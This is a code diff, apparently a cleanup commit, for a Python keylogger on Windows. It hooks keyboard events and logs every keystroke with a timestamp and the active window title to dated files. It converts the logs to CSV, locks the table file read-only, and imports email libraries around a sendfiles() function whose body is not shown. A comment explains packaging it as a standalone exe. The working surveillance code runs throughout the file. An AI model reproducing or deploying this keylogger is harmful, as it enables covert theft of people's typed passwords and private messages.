@@ -13,31 +13,20 @@ import os
 import zipfile
 import  portalocker
 from stat import S_IREAD, S_IRGRP, S_IROTH
-
-import  smtplib
+import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 import threading
-
 from threading import Thread
-
-
-
-
-
 from filelock import Timeout, FileLock
 from stat import S_IWUSR
-
-
-
 
 
 # To get this into a exe. use pyinstaller --onefile  -F main23.py
 
 global pathforlogs
-global pathforlogsbackup
 global keystrokecount
 keystrokecount = 0
 
@@ -52,54 +41,49 @@ def converttotable():
   if not os.path.exists(pathforlogs):  # if folder for the logs does exist, then create it.
     os.makedirs(pathforlogs)
 
-  locationofFileandNameForLogs = os.path.join(pathforlogs, datelogname + "-logfile.txt")
-  locationofFileandNameForLogsTable = os.path.join(pathforlogs, datelogname + "-logfile.csv")
+  location_of_file_and_name_for_logs = os.path.join(pathforlogs, datelogname + "-logfile.txt")
+  location_of_file_and_name_for_logs_table = os.path.join(pathforlogs, datelogname + "-logfile.csv")
 
   try:   # If file does not exist, then skip the function and keep going(text file will be created in the onkeyboard function).
-    f = open(locationofFileandNameForLogs, 'r')
+    f = open(location_of_file_and_name_for_logs, 'r')
 
   except FileNotFoundError:
     print("the file was not found. But keep going, it will be converted after  the text file created")
     return
 
-
   try:
-    os.chmod(locationofFileandNameForLogsTable, S_IWUSR | S_IREAD)  # this will set the table file to read and write.
+    os.chmod(location_of_file_and_name_for_logs_table, S_IWUSR | S_IREAD)  # this will set the table file to read and write.
   except FileNotFoundError:
     pass
     print("Cannot find the table file.")
     print("Most likely it has not been created yet, will continue to run the program")
 
-
-
   try:
     df = pd.read_csv(f, sep='|', encoding="ISO-8859-1", names=["TimeStamp", "Current Window", "KeyStrokes"])
-    df.to_csv(locationofFileandNameForLogsTable, index=None, )
+    df.to_csv(location_of_file_and_name_for_logs_table, index=None, )
   except PermissionError:
     print("WARNING: Cannot access the table file. If you have it open, please close it")
 
-  os.chmod(locationofFileandNameForLogsTable, S_IREAD) # After we are done with the file, we set it to read only. Because, If the user opens it, then we wont be able to write to it.
-
+  os.chmod(location_of_file_and_name_for_logs_table, S_IREAD)  # After we are done with the file, we set it to read only. Because, If the user opens it, then we wont be able to write to it.
 
 
 # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
 def givenewline():
-  datelogname = datetime.today().strftime('%m-%d-%Y')
+  date_log_name = datetime.today().strftime('%m-%d-%Y')
 
-  datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
-
+  date_time_stamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
 
   if not os.path.exists(pathforlogs):
     os.makedirs(pathforlogs)
 
-  LocationofFileandName = os.path.join(pathforlogs, datelogname + "-logfile.txt")
+  LocationofFileandName = os.path.join(pathforlogs, date_log_name + "-logfile.txt")
   w = win32gui
-  currentwindow = w.GetWindowText(w.GetForegroundWindow())
+  current_window = w.GetWindowText(w.GetForegroundWindow())
 
   logfile = open(LocationofFileandName, 'a+')
 
   logfile.write(
-    "\n" + datetimestamp + "|" + currentwindow + "|" + " ")  # Adds a new line. Enters the current date, time, and current window
+    "\n" + date_time_stamp + "|" + current_window + "|" + " ")  # Adds a new line. Enters the current date, time, and current window
   logfile.close()
 
 
@@ -147,8 +131,8 @@ def sendfiles():
 def OnKeyboardEvent(event):
   global windowname
 
-  w = win32gui
-  currentwindow = w.GetWindowText(w.GetForegroundWindow())
+  # w = win32gui
+  # currentwindow = w.GetWindowText(w.GetForegroundWindow())
 
   datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
   datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and the  time the keys were pressed
@@ -201,14 +185,14 @@ def OnKeyboardEvent(event):
     else:
 
       logfile2 = open(LocationofFileandName, 'a+')
-      logfile2.write("\n" + datetimestamp + "|" + currentwindow + "|" + " ")
+      logfile2.write("\n" + datetimestamp + "|" + windowname + "|" + " ")
       logfile2.close()
       print("the window has  changed")
 
 
 
   if event.Ascii == 13:  # if entered is pressed, then start a new line, add datetimestamp, windowname and delimter
-    keylogs = '\n' + datetimestamp + "|" + currentwindow + "|" + " "
+    keylogs = '\n' + datetimestamp + "|" + windowname + "|" + " "
 
   # if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
     # keylogs = ' <Backspace> '
